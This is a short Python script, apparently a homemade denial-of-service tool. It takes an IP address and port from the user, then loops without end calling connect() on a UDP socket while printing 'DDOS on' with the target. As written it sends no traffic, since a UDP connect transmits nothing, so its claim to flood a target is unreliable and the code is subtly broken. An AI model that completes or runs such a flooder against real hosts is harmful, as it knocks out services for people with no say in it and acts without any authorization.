#!/bin/python3

import socket


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip=str(input('IP: '))
port=int(input('Port: '))
print(ip)
sleep = 0



while (1000*10000):
      s.connect((ip,port))
      print("DDOS on ", ip,':',port)
    


